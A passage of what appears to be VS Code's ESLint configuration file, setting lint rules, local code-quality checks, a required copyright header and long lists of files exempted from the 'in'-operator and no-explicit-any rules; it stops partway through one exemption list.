/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// @ts-check
import fs from 'fs';
import { builtinModules } from 'module';
import path from 'path';
import tseslint from 'typescript-eslint';

import stylisticTs from '@stylistic/eslint-plugin-ts';
import * as pluginLocal from './.eslint-plugin-local/index.ts';
import * as pluginCopilotLocal from './extensions/copilot/.eslintplugin/index.ts';
import pluginImport from 'eslint-plugin-import';
import pluginJsdoc from 'eslint-plugin-jsdoc';

import pluginHeader from 'eslint-plugin-header';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

pluginHeader.rules.header.meta.schema = false;

const ignores = fs.readFileSync(path.join(import.meta.dirname, '.eslint-ignore'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.filter(line => line && !line.startsWith('#'));

export default tseslint.config(
	// Global ignores
	{
		ignores: [
			...ignores,
			'!**/.eslint-plugin-local/**/*'
		],
	},
	// All files (JS and TS)
	{
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
			'header': pluginHeader,
		},
		rules: {
			'constructor-super': 'warn',
			'curly': 'warn',
			'eqeqeq': 'warn',
			'prefer-const': [
				'warn',
				{
					'destructuring': 'all'
				}
			],
			'no-buffer-constructor': 'warn',
			'no-caller': 'warn',
			'no-case-declarations': 'warn',
			'no-debugger': 'warn',
			'no-duplicate-case': 'warn',
			'no-duplicate-imports': 'warn',
			'no-eval': 'warn',
			'no-async-promise-executor': 'warn',
			'no-extra-semi': 'warn',
			'no-new-wrappers': 'warn',
			'no-redeclare': 'off',
			'no-sparse-arrays': 'warn',
			'no-throw-literal': 'warn',
			'no-unsafe-finally': 'warn',
			'no-unused-labels': 'warn',
			'no-misleading-character-class': 'warn',
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context'
			], // non-complete list of globals that are easy to access unintentionally
			'no-var': 'warn',
			'semi': 'warn',
			'local/code-translation-remind': 'warn',
			'local/code-no-declare-const-enum': 'warn',
			'local/code-parameter-properties-must-have-explicit-accessibility': 'warn',
			'local/code-no-nls-in-standalone-editor': 'warn',
			'local/code-no-potentially-unsafe-disposables': 'warn',
			'local/code-no-dangerous-type-assertions': 'warn',
			'local/code-no-any-casts': 'warn',
			'local/code-no-standalone-editor': 'warn',
			'local/code-no-unexternalized-strings': 'warn',
			'local/code-must-use-super-dispose': 'warn',
			'local/code-declare-service-brand': 'warn',
			'local/code-no-reader-after-await': 'warn',
			'local/code-no-accessor-after-await': 'warn',
			'local/code-no-observable-get-in-reactive-context': 'warn',
			'local/code-no-localized-model-description': 'warn',
			'local/code-policy-localization-key-match': 'warn',
			'local/code-no-localization-template-literals': 'error',
			'local/code-no-icons-in-localized-strings': 'warn',
			'local/code-no-http-import': ['warn', { target: 'src/vs/**' }],
			'local/code-no-deep-import-of-internal': ['error', { '.*Internal': true, 'searchExtTypesInternal': false }],
			'local/code-layering': [
				'warn',
				{
					'common': [],
					'node': [
						'common'
					],
					'browser': [
						'common'
					],
					'electron-browser': [
						'common',
						'browser'
					],
					'electron-utility': [
						'common',
						'node'
					],
					'electron-main': [
						'common',
						'node',
						'electron-utility'
					]
				}
			],
			'header/header': [
				2,
				'block',
				[
					'---------------------------------------------------------------------------------------------',
					' *  Copyright (c) Microsoft Corporation. All rights reserved.',
					' *  Licensed under the MIT License. See License.txt in the project root for license information.',
					' *--------------------------------------------------------------------------------------------'
				]
			]
		},
	},
	// TS
	{
		files: [
			'**/*.{ts,tsx,mts,cts}',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@stylistic/ts': stylisticTs,
			'@typescript-eslint': tseslint.plugin,
			'local': pluginLocal,
			'jsdoc': pluginJsdoc,
		},
		rules: {
			// Disable built-in semi rules in favor of stylistic
			'semi': 'off',
			'@stylistic/ts/semi': 'warn',
			'@stylistic/ts/member-delimiter-style': 'warn',
			'local/code-no-unused-expressions': [
				'warn',
				{
					'allowTernary': true
				}
			],
			'jsdoc/no-types': 'warn',
			'local/code-no-static-self-ref': 'warn',
			'@typescript-eslint/naming-convention': [
				'warn',
				{
					'selector': 'class',
					'format': [
						'PascalCase'
					]
				}
			]
		}
	},
	// Disallow common telemetry properties in event data
	{
		files: [
			'src/**/*.ts',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-telemetry-common-property': 'warn',
		}
	},
	// Disallow 'in' operator except in type predicates
	{
		files: [
			'**/*.ts',
			'.eslint-plugin-local/**/*.ts', // Explicitly include files under dot directories
		],
		ignores: [
			'src/bootstrap-node.ts',
			'build/lib/extensions.ts',
			'build/lib/test/render.test.ts',
			'extensions/copilot/**/*',
			'extensions/debug-auto-launch/src/extension.ts',
			'extensions/emmet/src/updateImageSize.ts',
			'extensions/emmet/src/util.ts',
			'extensions/github-authentication/src/node/fetch.ts',
			'extensions/tunnel-forwarding/src/extension.ts',
			'extensions/typescript-language-features/src/utils/platform.ts',
			'extensions/typescript-language-features/web/src/webServer.ts',
			'src/vs/base/browser/broadcast.ts',
			'src/vs/base/browser/canIUse.ts',
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/markdownRenderer.ts',
			'src/vs/base/browser/touch.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/desktopEnvironmentInfo.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/editor/browser/controller/editContext/native/debugEditContext.ts',
			'src/vs/editor/browser/gpu/gpuUtils.ts',
			'src/vs/editor/browser/gpu/taskQueue.ts',
			'src/vs/editor/browser/view.ts',
			'src/vs/editor/browser/widget/diffEditor/diffEditorWidget.ts',
			'src/vs/editor/browser/widget/diffEditor/utils.ts',
			'src/vs/editor/browser/widget/multiDiffEditor/multiDiffEditorWidgetImpl.ts',
			'src/vs/editor/common/config/editorOptions.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteContribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteController.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/edit.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/provideInlineCompletions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/platform/accessibilitySignal/browser/accessibilitySignalService.ts',
			'src/vs/platform/configuration/common/configuration.ts',
			'src/vs/platform/configuration/common/configurationModels.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/test/common/scanner.test.ts',
			'src/vs/platform/dataChannel/browser/forwardingTelemetryService.ts',
			'src/vs/platform/hover/browser/hoverService.ts',
			'src/vs/platform/hover/browser/hoverWidget.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/mcp/common/mcpManagementCli.ts',
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/browser/mainThreadDebugService.ts',
			'src/vs/workbench/api/browser/mainThreadTesting.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHostChatAgents2.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostNotebookKernels.ts',
			'src/vs/workbench/api/common/extHostQuickOpen.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/node/loopbackServer.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/extHostTypeConverters.test.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/browser/parts/paneCompositeBar.ts',
			'src/vs/workbench/browser/parts/titlebar/titlebarPart.ts',
			'src/vs/workbench/browser/workbench.ts',
			'src/vs/workbench/common/notifications.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/attachments/chatAttachmentResolveService.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatAttachmentsContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatConfirmationWidget.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatElicitationContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatReferencesContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatTreeContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/toolInvocationParts/abstractToolConfirmationSubPart.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSession.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSessionStorage.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatInlineAnchorWidget.ts',
			'src/vs/workbench/contrib/chat/browser/accessibility/chatResponseAccessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/widget/input/editor/chatInputCompletions.ts',
			'src/vs/workbench/contrib/chat/common/model/chatModel.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.test.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.ts',
			'src/vs/workbench/contrib/chat/test/common/tools/builtinTools/manageTodoListTool.test.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/debugModel.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replAccessibilityAnnouncer.ts',
			'src/vs/workbench/contrib/editSessions/browser/editSessionsStorageService.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/extensions/common/extensionQuery.ts',
			'src/vs/workbench/contrib/interactive/browser/interactiveEditorInput.ts',
			'src/vs/workbench/contrib/issue/browser/issueFormService.ts',
			'src/vs/workbench/contrib/issue/browser/issueQuickAccess.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mcp/browser/mcpElicitationService.ts',
			'src/vs/workbench/contrib/mcp/common/mcpLanguageModelToolContribution.ts',
			'src/vs/workbench/contrib/mcp/common/mcpResourceFilesystem.ts',
			'src/vs/workbench/contrib/mcp/common/mcpSamplingLog.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServer.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServerRequestHandler.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpRegistryTypes.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpServerRequestHandler.test.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/cellOutputActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/notebook.chat.contribution.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelView.ts',
			'src/vs/workbench/contrib/output/browser/outputView.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/remoteTunnel/electron-browser/remoteTunnel.contribution.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/listProjection.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/treeProjection.ts',
			'src/vs/workbench/contrib/testing/browser/testCoverageBars.ts',
			'src/vs/workbench/contrib/testing/browser/testExplorerActions.ts',
			'src/vs/workbench/contrib/testing/browser/testingOutputPeek.ts',
			'src/vs/workbench/contrib/testing/browser/testingProgressUiService.ts',
			'src/vs/workbench/contrib/testing/browser/testResultsView/testResultsTree.ts',
			'src/vs/workbench/contrib/testing/common/testCoverageService.ts',
			'src/vs/workbench/contrib/testing/common/testResultService.ts',
			'src/vs/workbench/contrib/testing/common/testingChatAgentTool.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/themes/browser/themes.contribution.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStarted.contribution.ts',
			'src/vs/workbench/services/environment/electron-browser/environmentService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingIO.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/textSearchManager.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/platform/agentHost/common/state/protocol/reducers.ts',
			'test/automation/src/playwrightDriver.ts',
			'.eslint-plugin-local/**/*',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-in-operator': 'warn',
		}
	},
	// Strict no explicit `any`
	{
		files: [
			// Extensions
			'extensions/git/src/**/*.ts',
			'extensions/git-base/src/**/*.ts',
			'extensions/github/src/**/*.ts',
			// vscode
			'src/**/*.ts',
		],
		ignores: [
			// Extensions
			'extensions/git/src/commands.ts',
			'extensions/git/src/decorators.ts',
			'extensions/git/src/git.ts',
			'extensions/git/src/util.ts',
			'extensions/git-base/src/decorators.ts',
			'extensions/github/src/util.ts',
			// vscode d.ts
			'src/vs/amdX.ts',
			'src/vs/monaco.d.ts',
			'src/vscode-dts/**',
			// Base
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/mouseEvent.ts',
			'src/vs/base/node/processes.ts',
			'src/vs/base/common/arrays.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/console.ts',
			'src/vs/base/common/decorators.ts',
			'src/vs/base/common/errorMessage.ts',
			'src/vs/base/common/errors.ts',
			'src/vs/base/common/event.ts',
			'src/vs/base/common/hotReload.ts',
			'src/vs/base/common/hotReloadHelpers.ts',
			'src/vs/base/common/json.ts',
			'src/vs/base/common/jsonSchema.ts',
			'src/vs/base/common/lifecycle.ts',
			'src/vs/base/common/map.ts',
			'src/vs/base/common/marshalling.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/performance.ts',
			'src/vs/base/common/platform.ts',
			'src/vs/base/common/processes.ts',
			'src/vs/base/common/types.ts',
			'src/vs/base/common/uriIpc.ts',
			'src/vs/base/common/verifier.ts',
			'src/vs/base/common/observableInternal/base.ts',
			'src/vs/base/common/observableInternal/changeTracker.ts',
			'src/vs/base/common/observableInternal/set.ts',
			'src/vs/base/common/observableInternal/transaction.ts',
			'src/vs/base/common/worker/webWorkerBootstrap.ts',
			'src/vs/base/test/common/mock.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/base/test/common/troubleshooting.ts',
			'src/vs/base/test/common/utils.ts',
			'src/vs/base/browser/ui/breadcrumbs/breadcrumbsWidget.ts',
			'src/vs/base/browser/ui/grid/grid.ts',
			'src/vs/base/browser/ui/grid/gridview.ts',
			'src/vs/base/browser/ui/list/listPaging.ts',
			'src/vs/base/browser/ui/list/listView.ts',
			'src/vs/base/browser/ui/list/listWidget.ts',
			'src/vs/base/browser/ui/list/rowCache.ts',
			'src/vs/base/browser/ui/sash/sash.ts',
			'src/vs/base/browser/ui/table/tableWidget.ts',
			'src/vs/base/parts/ipc/common/ipc.net.ts',
			'src/vs/base/parts/ipc/common/ipc.ts',
			'src/vs/base/parts/ipc/electron-main/ipcMain.ts',
			'src/vs/base/parts/ipc/node/ipc.cp.ts',
			'src/vs/base/common/observableInternal/experimental/reducer.ts',
			'src/vs/base/common/observableInternal/experimental/utils.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugGetDependencyGraph.ts',
			'src/vs/base/common/observableInternal/logging/logging.ts',
			'src/vs/base/common/observableInternal/observables/baseObservable.ts',
			'src/vs/base/common/observableInternal/observables/derived.ts',
			'src/vs/base/common/observableInternal/observables/derivedImpl.ts',
			'src/vs/base/common/observableInternal/observables/observableFromEvent.ts',
			'src/vs/base/common/observableInternal/observables/observableSignalFromEvent.ts',
			'src/vs/base/common/observableInternal/reactions/autorunImpl.ts',
			'src/vs/base/common/observableInternal/utils/utils.ts',
			'src/vs/base/common/observableInternal/utils/utilsCancellation.ts',
			'src/vs/base/parts/ipc/test/node/testService.ts',
			'src/vs/base/common/observableInternal/logging/debugger/debuggerRpc.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/rpc.ts',
			'src/vs/base/test/browser/ui/grid/util.ts',
			// Platform
			'src/vs/platform/commands/common/commands.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/common/contextkey.ts',
			'src/vs/platform/contextview/browser/contextView.ts',
			'src/vs/platform/debug/common/extensionHostDebugIpc.ts',
			'src/vs/platform/debug/electron-main/extensionHostDebugIpc.ts',
			'src/vs/platform/diagnostics/common/diagnostics.ts',
			'src/vs/platform/download/common/downloadIpc.ts',
			'src/vs/platform/extensions/common/extensions.ts',
			'src/vs/platform/instantiation/common/descriptors.ts',
			'src/vs/platform/instantiation/common/extensions.ts',
			'src/vs/platform/instantiation/common/instantiation.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/instantiation/common/serviceCollection.ts',
			'src/vs/platform/keybinding/common/keybinding.ts',
			'src/vs/platform/keybinding/common/keybindingResolver.ts',
			'src/vs/platform/keybinding/common/keybindingsRegistry.ts',
			'src/vs/platform/keybinding/common/resolvedKeybindingItem.ts',
			'src/vs/platform/languagePacks/node/languagePacks.ts',
			'src/vs/platform/list/browser/listService.ts',
			'src/vs/platform/log/browser/log.ts',
			'src/vs/platform/log/common/log.ts',
			'src/vs/platform/log/common/logIpc.ts',
			'src/vs/platform/log/electron-main/logIpc.ts',
			'src/vs/platform/meteredConnection/electron-main/meteredConnectionChannel.ts',
			'src/vs/platform/observable/common/wrapInHotClass.ts',
			'src/vs/platform/observable/common/wrapInReloadableClass.ts',
			'src/vs/platform/policy/common/policyIpc.ts',
			'src/vs/platform/profiling/common/profilingTelemetrySpec.ts',
			'src/vs/platform/quickinput/browser/quickInputActions.ts',
			'src/vs/platform/quickinput/common/quickInput.ts',
			'src/vs/platform/registry/common/platform.ts',
			'src/vs/platform/remote/browser/browserSocketFactory.ts',
			'src/vs/platform/remote/browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remote/common/remoteAgentConnection.ts',
			'src/vs/platform/remote/common/remoteAuthorityResolver.ts',
			'src/vs/platform/remote/electron-browser/electronRemoteResourceLoader.ts',
			'src/vs/platform/remote/electron-browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remoteTunnel/node/remoteTunnelService.ts',
			'src/vs/platform/request/common/request.ts',
			'src/vs/platform/request/common/requestIpc.ts',
			'src/vs/platform/request/electron-utility/requestService.ts',
			'src/vs/platform/request/node/proxy.ts',
			'src/vs/platform/telemetry/browser/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/remoteTelemetryChannel.ts',
			'src/vs/platform/telemetry/node/errorTelemetry.ts',
			'src/vs/platform/theme/common/iconRegistry.ts',
			'src/vs/platform/theme/common/tokenClassificationRegistry.ts',
			'src/vs/platform/update/common/updateIpc.ts',
			'src/vs/platform/update/electron-main/updateService.snap.ts',
			'src/vs/platform/url/common/urlIpc.ts',
			'src/vs/platform/userDataProfile/common/userDataProfileIpc.ts',
			'src/vs/platform/userDataProfile/electron-main/userDataProfileStorageIpc.ts',
			'src/vs/platform/userDataSync/common/abstractSynchronizer.ts',
			'src/vs/platform/userDataSync/common/extensionsMerge.ts',
			'src/vs/platform/userDataSync/common/extensionsSync.ts',
			'src/vs/platform/userDataSync/common/globalStateMerge.ts',
			'src/vs/platform/userDataSync/common/globalStateSync.ts',
			'src/vs/platform/userDataSync/common/settingsMerge.ts',
			'src/vs/platform/userDataSync/common/settingsSync.ts',
			'src/vs/platform/userDataSync/common/userDataSync.ts',
			'src/vs/platform/userDataSync/common/userDataSyncIpc.ts',
			'src/vs/platform/userDataSync/common/userDataSyncServiceIpc.ts',
			'src/vs/platform/webview/common/webviewManagerService.ts',
			'src/vs/platform/instantiation/test/common/instantiationServiceMock.ts',
			'src/vs/platform/keybinding/test/common/mockKeybindingService.ts',
			// Editor
			'src/vs/editor/standalone/browser/standaloneEditor.ts',
			'src/vs/editor/standalone/browser/standaloneLanguages.ts',
			'src/vs/editor/standalone/browser/standaloneServices.ts',
			'src/vs/editor/test/browser/testCodeEditor.ts',
			'src/vs/editor/test/common/testTextModel.ts',
			'src/vs/editor/contrib/bracketMatching/browser/bracketMatching.ts',
			'src/vs/editor/contrib/codeAction/browser/codeAction.ts',
			'src/vs/editor/contrib/codeAction/browser/codeActionCommands.ts',
			'src/vs/editor/contrib/codeAction/common/types.ts',
			'src/vs/editor/contrib/colorPicker/browser/colorDetector.ts',
			'src/vs/editor/contrib/diffEditorBreadcrumbs/browser/contribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/dropIntoEditorContribution.ts',
			'src/vs/editor/contrib/find/browser/findController.ts',
			'src/vs/editor/contrib/find/browser/findModel.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/goToCommands.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/symbolNavigation.ts',
			'src/vs/editor/contrib/hover/browser/hoverActions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/structuredLogger.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/utils.ts',
			'src/vs/editor/contrib/smartSelect/browser/smartSelect.ts',
			'src/vs/editor/contrib/stickyScroll/browser/stickyScrollModelProvider.ts',
			'src/vs/editor/contrib/unicodeHighlighter/browser/unicodeHighlighter.ts',
			'src/vs/editor/contrib/wordHighlighter/browser/wordHighlighter.ts',
			'src/vs/editor/standalone/common/monarch/monarchCommon.ts',
			'src/vs/editor/standalone/common/monarch/monarchCompile.ts',
			'src/vs/editor/standalone/common/monarch/monarchLexer.ts',
			'src/vs/editor/standalone/common/monarch/monarchTypes.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/controller/commands.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/inlineCompletionsModel.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/typingSpeed.ts',
			'src/vs/editor/contrib/inlineCompletions/test/browser/utils.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/components/gutterIndicatorView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/utils/utils.ts',
			// Workbench
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHost.protocol.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostCodeInsets.ts',
			'src/vs/workbench/api/common/extHostCommands.ts',
			'src/vs/workbench/api/common/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/common/extHostDataChannels.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostExtensionActivator.ts',
			'src/vs/workbench/api/common/extHostExtensionService.ts',
			'src/vs/workbench/api/common/extHostFileSystemConsumer.ts',
			'src/vs/workbench/api/common/extHostFileSystemEventService.ts',
			'src/vs/workbench/api/common/extHostLanguageFeatures.ts',
			'src/vs/workbench/api/common/extHostLanguageModelTools.ts',
			'src/vs/workbench/api/common/extHostMcp.ts',
			'src/vs/workbench/api/common/extHostMemento.ts',
			'src/vs/workbench/api/common/extHostMessageService.ts',
			'src/vs/workbench/api/common/extHostNotebookDocument.ts',
			'src/vs/workbench/api/common/extHostNotebookDocumentSaveParticipant.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostRpcService.ts',
			'src/vs/workbench/api/common/extHostSCM.ts',
			'src/vs/workbench/api/common/extHostSearch.ts',
			'src/vs/workbench/api/common/extHostStatusBar.ts',
			'src/vs/workbench/api/common/extHostStoragePaths.ts',
			'src/vs/workbench/api/common/extHostTelemetry.ts',
			'src/vs/workbench/api/common/extHostTesting.ts',
			'src/vs/workbench/api/common/extHostTextEditor.ts',
			'src/vs/workbench/api/common/extHostTimeline.ts',
			'src/vs/workbench/api/common/extHostTreeViews.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/common/extHostTypes/es5ClassCompat.ts',
			'src/vs/workbench/api/common/extHostTypes/location.ts',
			'src/vs/workbench/api/common/extHostWebview.ts',
			'src/vs/workbench/api/common/extHostWebviewMessaging.ts',
			'src/vs/workbench/api/common/extHostWebviewPanels.ts',
			'src/vs/workbench/api/common/extHostWebviewView.ts',
			'src/vs/workbench/api/common/extHostWorkspace.ts',
			'src/vs/workbench/api/common/extensionHostMain.ts',
			'src/vs/workbench/api/node/extHostAuthentication.ts',
			'src/vs/workbench/api/node/extHostCLIServer.ts',
			'src/vs/workbench/api/node/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/node/extHostDownloadService.ts',
			'src/vs/workbench/api/node/extHostExtensionService.ts',
			'src/vs/workbench/api/node/extHostMcpNode.ts',
			'src/vs/workbench/api/node/extensionHostProcess.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/api/worker/extensionHostWorker.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibilityConfiguration.ts',
			'src/vs/workbench/contrib/accessibilitySignals/browser/commands.ts',
			'src/vs/workbench/contrib/authentication/browser/actions/manageTrustedMcpServersForAccountAction.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/bulkTextEdits.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPane.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPreview.ts',
			'src/vs/workbench/contrib/codeEditor/browser/inspectEditorTokens/inspectEditorTokens.ts',
			'src/vs/workbench/contrib/codeEditor/browser/outline/documentSymbolsOutline.ts',
			'src/vs/workbench/contrib/codeEditor/electron-browser/selectionClipboard.ts',
			'src/vs/workbench/contrib/commands/common/commands.contribution.ts',
			'src/vs/workbench/contrib/comments/browser/commentsTreeViewer.ts',
			'src/vs/workbench/contrib/comments/browser/commentsView.ts',
			'src/vs/workbench/contrib/comments/browser/reactionsAction.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditorInputFactory.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditors.ts',
			'src/vs/workbench/contrib/customEditor/common/customEditor.ts',
			'src/vs/workbench/contrib/debug/browser/debugActionViewItems.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugCommands.ts',
			'src/vs/workbench/contrib/debug/browser/debugConfigurationManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorActions.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorContribution.ts',
			'src/vs/workbench/contrib/debug/browser/debugHover.ts',
			'src/vs/workbench/contrib/debug/browser/debugService.ts',
			'src/vs/workbench/contrib/debug/browser/debugSession.ts',
			'src/vs/workbench/contrib/debug/browser/rawDebugSession.ts',
			'src/vs/workbench/contrib/debug/browser/repl.ts',
			'src/vs/workbench/contrib/debug/browser/replViewer.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/abstractDebugAdapter.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replModel.ts',
			'src/vs/workbench/contrib/debug/test/common/mockDebug.ts',
			'src/vs/workbench/contrib/editSessions/common/workspaceStateSync.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/utils.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/telemetry/arcTelemetrySender.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionEditor.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionRecommendationNotificationService.ts',
			'src/vs/workbench/contrib/extensions/browser/extensions.contribution.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActions.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActivationProgress.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViewer.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViews.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsWorkbenchService.ts',
			'src/vs/workbench/contrib/extensions/common/extensions.ts',
